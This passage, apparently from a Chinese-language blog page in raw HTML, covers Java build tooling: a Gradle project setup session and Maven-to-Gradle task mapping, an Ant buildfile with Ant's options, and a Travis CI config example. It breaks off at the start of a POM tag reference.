id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h1><p><a href="https://docs.gradle.org/current/userguide/userguide.html">Gradle User Manual</a></p><ol><li>当然首先还是安装。</li><li><code>gradle init</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gradle init</span></span><br><span class="line"></span><br><span class="line">Select type of project to generate:</span><br><span class="line">  1: basic</span><br><span class="line">  2: application</span><br><span class="line">  3: library</span><br><span class="line">  4: Gradle plugin</span><br><span class="line">Enter selection (default: basic) [1..4] 2</span><br><span class="line"></span><br><span class="line">Split functionality across multiple subprojects?:</span><br><span class="line">   1: no - only one application project</span><br><span class="line">   2: yes - application and library projects</span><br><span class="line">Enter selection (default: no - only one application project) [1..2] 2</span><br><span class="line"></span><br><span class="line">Select implementation language:</span><br><span class="line">  1: C++</span><br><span class="line">  2: Groovy</span><br><span class="line">  3: Java</span><br><span class="line">  4: Kotlin</span><br><span class="line">  5: Scala</span><br><span class="line">  6: Swift</span><br><span class="line">Enter selection (default: Java) [1..6] 3</span><br><span class="line"></span><br><span class="line">Select build script DSL:</span><br><span class="line">  1: Groovy</span><br><span class="line">  2: Kotlin</span><br><span class="line">Enter selection (default: Groovy) [1..2] 1</span><br><span class="line"></span><br><span class="line">Select test framework:</span><br><span class="line">  1: JUnit 4</span><br><span class="line">  2: TestNG</span><br><span class="line">  3: Spock</span><br><span class="line">  4: JUnit Jupiter</span><br><span class="line">Enter selection (default: JUnit 4) [1..4]</span><br><span class="line"></span><br><span class="line">Project name (default: demo):</span><br><span class="line">Source package (default: demo):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL</span><br><span class="line">2 actionable tasks: 2 executed</span><br></pre></td></tr></table></figure><ol start="3"><li>运行测试 <code>./gradlew check</code></li><li>运行 <code>./gradlew run</code></li><li>打包（可选） <code>./gradlew build</code></li><li>上传（可选） <code>./gradlew build --scan</code></li></ol><h2 id="Gradle-与-Maven-的速度对比："><a href="#Gradle-与-Maven-的速度对比：" class="headerlink" title="Gradle 与 Maven 的速度对比："></a>Gradle 与 Maven 的速度对比：</h2><p><img src="https://gradle.org/images/gradle-vs-maven.gif" alt="img"></p><p><a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migrating_from_maven">Migrating Builds From Apache Maven</a></p><p>Here is a list of some of the main Maven phases and the Gradle tasks that they map to:</p><ul><li><p><code>clean</code></p><p>Use the <code>clean</code> task provided by the Base Plugin.</p></li><li><p><code>compile</code></p><p>Use the <code>classes</code> task provided by the <a href="https://docs.gradle.org/current/userguide/java_plugin.html#sec:java_tasks">Java Plugin</a> and other JVM language plugins. This compiles all classes for all source files of all languages and also performs <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:filtering_resources">resource filtering</a> via the <code>processResources</code> task.</p></li><li><p><code>test</code></p><p>Use the <code>test</code> task provided by the Java Plugin. It runs just the unit tests, or more specifically, the tests that make up the <a href="https://docs.gradle.org/current/userguide/java_plugin.html#source_sets"><code>test</code> source set</a>.</p></li><li><p><code>package</code></p><p>Use the <code>assemble</code> task provided by the Base Plugin. This builds whatever is the appropriate package for the project, for example a JAR for Java libraries or a WAR for traditional Java webapps.</p></li><li><p><code>verify</code></p><p>Use the <code>check</code> task provided by the Base Plugin. This runs all verification tasks that are attached to it, which typically includes the unit tests, any static analysis tasks — such as <a href="https://docs.gradle.org/current/userguide/checkstyle_plugin.html#checkstyle_plugin">Checkstyle</a> — and others. If you want to include integration tests, you will have to <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:integration_tests">configure these manually</a>, which is a simple process.</p></li><li><p><code>install</code></p><p>Use the <code>publishToMavenLocal</code> task provided by the <a href="https://docs.gradle.org/current/userguide/publishing_maven.html#publishing_maven:tasks">Maven Publish Plugin</a>.Note that Gradle builds don’t require you to “install” artifacts as you have access to more appropriate features like <a href="https://docs.gradle.org/current/userguide/declaring_dependencies.html#sub:project_dependencies">inter-project dependencies</a> and <a href="https://docs.gradle.org/current/userguide/composite_builds.html#composite_builds">composite builds</a>. You should only use <code>publishToMavenLocal</code> for interoperating with Maven builds.Gradle also allows you to resolve dependencies against the local Maven cache, as described in the <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:declaring_repos">Declaring repositories</a> section.</p></li><li><p><code>deploy</code></p><p>Use the <code>publish</code> task provided by the <a href="https://docs.gradle.org/current/userguide/publishing_maven.html#publishing_maven:tasks">Maven Publish Plugin</a> — making sure you switch from the older Maven Plugin (ID: <code>maven</code>) if your build is using that one. This will publish your package to all configured publication repositories. There are also other tasks that allow you to publish to a single repository even when multiple ones are defined.Note that the Maven Publish Plugin does not publish <strong>source and Javadoc JARs</strong> <em>by default</em>, but this can easily be activated as explained in <a href="https://docs.gradle.org/current/userguide/building_java_projects.html#sec:java_packaging">the guide for building java projects</a>.</p></li></ul><h1 id="Ant"><a href="#Ant" class="headerlink" title="Ant"></a>Ant</h1><p><a href="https://ant.apache.org/manual/index.html">Ant Manual</a></p><p>example buildfile:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">name</span>=<span class="string">&quot;MyProject&quot;</span> <span class="attr">default</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">basedir</span>=<span class="string">&quot;.&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">    simple example build file</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- set global properties for this build --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;src&quot;</span> <span class="attr">location</span>=<span class="string">&quot;src&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;build&quot;</span> <span class="attr">location</span>=<span class="string">&quot;build&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">location</span>=<span class="string">&quot;dist&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the time stamp --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tstamp</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the build directory structure used by compile --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;compile&quot;</span> <span class="attr">depends</span>=<span class="string">&quot;init&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;compile the source&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Compile the Java code from $&#123;src&#125; into $&#123;build&#125; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javac</span> <span class="attr">srcdir</span>=<span class="string">&quot;$&#123;src&#125;&quot;</span> <span class="attr">destdir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">depends</span>=<span class="string">&quot;compile&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;generate the distribution&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the distribution directory --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;dist&#125;/lib&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Put everything in $&#123;build&#125; into the MyProject-$&#123;DSTAMP&#125;.jar file --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jar</span> <span class="attr">jarfile</span>=<span class="string">&quot;$&#123;dist&#125;/lib/MyProject-$&#123;DSTAMP&#125;.jar&quot;</span> <span class="attr">basedir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;clean&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;clean up&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Delete the $&#123;build&#125; and $&#123;dist&#125; directory trees --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;dist&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ant [options] [target [target2 [target3] ...]]</span><br><span class="line">Options:</span><br><span class="line">  -help, -h              print this message and exit</span><br><span class="line">  -projecthelp, -p       print project help information and exit</span><br><span class="line">  -version               print the version information and exit</span><br><span class="line">  -diagnostics           print information that might be helpful to</span><br><span class="line">                         diagnose or report problems and exit</span><br><span class="line">  -quiet, -q             be extra quiet</span><br><span class="line">  -silent, -S            print nothing but task outputs and build failures</span><br><span class="line">  -verbose, -v           be extra verbose</span><br><span class="line">  -debug, -d             print debugging information</span><br><span class="line">  -emacs, -e             produce logging information without adornments</span><br><span class="line">  -lib &lt;path&gt;            specifies a path to search for jars and classes</span><br><span class="line">  -logfile &lt;file&gt;        use given file for log</span><br><span class="line">    -l     &lt;file&gt;                &#x27;&#x27;</span><br><span class="line">  -logger &lt;classname&gt;    the class which is to perform logging</span><br><span class="line">  -listener &lt;classname&gt;  add an instance of class as a project listener</span><br><span class="line">  -noinput               do not allow interactive input</span><br><span class="line">  -buildfile &lt;file&gt;      use given buildfile</span><br><span class="line">    -file    &lt;file&gt;              &#x27;&#x27;</span><br><span class="line">    -f       &lt;file&gt;              &#x27;&#x27;</span><br><span class="line">  -D&lt;property&gt;=&lt;value&gt;   use value for given property</span><br><span class="line">  -keep-going, -k        execute all targets that do not depend</span><br><span class="line">                         on failed target(s)</span><br><span class="line">  -propertyfile &lt;name&gt;   load all properties from file with -D</span><br><span class="line">                         properties taking precedence</span><br><span class="line">  -inputhandler &lt;class&gt;  the class which will handle input requests</span><br><span class="line">  -find &lt;file&gt;           (s)earch for buildfile towards the root of</span><br><span class="line">    -s  &lt;file&gt;           the filesystem and use it</span><br><span class="line">  -nice  number          A niceness value for the main thread:</span><br><span class="line">                         1 (lowest) to 10 (highest); 5 is the default</span><br><span class="line">  -nouserlib             Run ant without using the jar files from $&#123;user.home&#125;/.ant/lib</span><br><span class="line">  -noclasspath           Run ant without using CLASSPATH</span><br><span class="line">  -autoproxy             Java 5+ : use the OS proxies</span><br><span class="line">  -main &lt;class&gt;          override Ant&#x27;s normal entry point</span><br></pre></td></tr></table></figure><h1 id="Travis-CI"><a href="#Travis-CI" class="headerlink" title="Travis-CI"></a>Travis-CI</h1><p><a href="http://www.ruanyifeng.com/blog/2017/12/travis_ci_tutorial.html">持续集成服务 Travis CI 教程</a></p><p><a href="https://docs.travis-ci.com/user/tutorial/">Travis CI Tutorial</a></p><p>项目根目录添加<code>.travis.yml</code>文件</p><p>python项目示例：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">python</span></span><br><span class="line"><span class="attr">sudo:</span> <span class="string">required</span></span><br><span class="line"><span class="attr">before_install:</span> <span class="string">sudo</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">foo</span></span><br><span class="line"><span class="attr">script:</span> <span class="string">bundle</span> <span class="string">exec</span> <span class="string">thor</span> <span class="string">build</span>  <span class="comment"># 指定构建或测试脚本</span></span><br><span class="line"><span class="attr">install:</span> <span class="string">./install-dependencies.sh</span>  <span class="comment"># 安装指定脚本</span></span><br></pre></td></tr></table></figure><h1 id="POM-标签大全详解"><a href="#POM-标签大全详解" class="headerlink" title="POM 标签大全详解"></a>POM 标签大全详解</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span 